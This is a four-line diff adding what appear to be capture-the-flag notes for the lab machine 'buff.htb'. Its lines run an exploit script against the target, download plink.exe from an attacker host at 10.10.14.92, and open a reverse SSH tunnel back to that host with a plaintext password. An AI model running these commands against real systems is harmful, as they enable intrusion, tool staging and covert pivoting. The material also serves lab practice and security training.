@@ -1,0 +1,4 @@
+python2 gym_exploit.py 'http://buff.htb:8080/'
+Invoke-WebRequest http://10.10.14.92:8000/plink.exe -Outfile plink.exe
+./plink -ssh -R 8888:10.10.14.92:8888 Kaushik@10.10.14.92 -pw mastiboss
+
